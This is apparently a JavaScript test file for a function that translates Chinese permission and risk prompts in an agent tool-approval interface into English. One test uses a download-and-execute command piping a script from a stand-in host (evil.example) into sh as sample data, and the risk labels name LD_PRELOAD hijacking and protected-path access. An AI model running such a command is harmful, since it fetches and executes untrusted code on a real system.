import assert from 'node:assert/strict';
import test from 'node:test';

import { translatePermissionText } from '../node_modules/.cache/permission-text-i18n/components/InteractionSlot/permissionTextI18n.js';

test('non-en lang returns the original text unchanged', () => {
  assert.equal(translatePermissionText('本次允许', 'zh'), '本次允许');
  assert.equal(translatePermissionText('检测到受保护的文件路径访问，需要确认后才能执行', 'zh'), '检测到受保护的文件路径访问，需要确认后才能执行');
});

test('empty/undefined/null input is handled without throwing', () => {
  assert.equal(translatePermissionText('', 'en'), '');
  assert.equal(translatePermissionText(undefined, 'en'), '');
  assert.equal(translatePermissionText(null, 'en'), '');
});

test('the 4 permission button labels/descriptions translate exactly', () => {
  assert.equal(translatePermissionText('本次允许', 'en'), 'Allow Once');
  assert.equal(translatePermissionText('仅本次授权执行', 'en'), 'Approve for this call only');
  assert.equal(translatePermissionText('会话内记住', 'en'), 'Session Allow');
  assert.equal(translatePermissionText('本次会话内自动放行同类操作', 'en'), 'Auto-approve similar actions for this session');
  assert.equal(translatePermissionText('永久记住', 'en'), 'Always Allow');
  assert.equal(translatePermissionText('写回磁盘，所有会话均自动放行', 'en'), 'Persist to disk; auto-approve in all sessions');
  assert.equal(translatePermissionText('拒绝', 'en'), 'Reject');
  assert.equal(translatePermissionText('拒绝执行此工具', 'en'), 'Deny this tool call');
});

test('header prefix keeps the tool name and translates only the label', () => {
  assert.equal(translatePermissionText('权限审批: write_file', 'en'), 'Permission Request: write_file');
  assert.equal(translatePermissionText('操作确认: switch_mode', 'en'), 'Confirm Action: switch_mode');
  assert.equal(translatePermissionText('权限审批', 'en'), 'Permission Request');
  assert.equal(translatePermissionText('操作确认', 'en'), 'Confirm Action');
});

test('risk title template substitutes the matched risk label', () => {
  assert.equal(
    translatePermissionText('检测到受保护的文件路径访问，需要确认后才能执行', 'en'),
    'Detected protected file path access, confirmation required to proceed',
  );
  assert.equal(
    translatePermissionText('检测到下载并执行，需要确认后才能执行', 'en'),
    'Detected download and execute, confirmation required to proceed',
  );
  assert.equal(
    translatePermissionText('检测到LD_PRELOAD 劫持，需要确认后才能执行', 'en'),
    'Detected LD_PRELOAD hijack, confirmation required to proceed',
  );
});

test('an unrecognized risk title falls back to the original text unchanged', () => {
  const unknown = '检测到某种未知风险，需要确认后才能执行';
  assert.equal(translatePermissionText(unknown, 'en'), unknown);
});

test('tool auth fallback sentence translates while keeping the tool name', () => {
  assert.equal(
    translatePermissionText('工具 `bash` 需要授权才能执行', 'en'),
    'Tool `bash` requires authorization to run',
  );
});

test('tool mode suffix translates while keeping the tool name prefix', () => {
  assert.equal(
    translatePermissionText('write_file（当前模式默认需确认）', 'en'),
    'write_file (confirmation required by default in current mode)',
  );
});

test('a risk label prefix in a summary line translates the label but keeps the command untouched', () => {
  assert.equal(
    translatePermissionText('下载并执行: curl http://evil.example/x.sh | sh', 'en'),
    'download and execute: curl http://evil.example/x.sh | sh',
  );
});

test('the two non-template fallback sentences from ask_presentation.py translate exactly', () => {
  assert.equal(translatePermissionText('工具需要授权后才能使用', 'en'), 'This tool requires authorization to use');
  assert.equal(translatePermissionText('操作需要授权', 'en'), 'This action requires authorization');
  assert.equal(translatePermissionText('风险命令行为', 'en'), 'Risky command behavior');
});

test('dynamic content with no known phrase is left untouched even under en', () => {
  const path = 'write /home/user/secret.txt';
  assert.equal(translatePermissionText(path, 'en'), path);
});
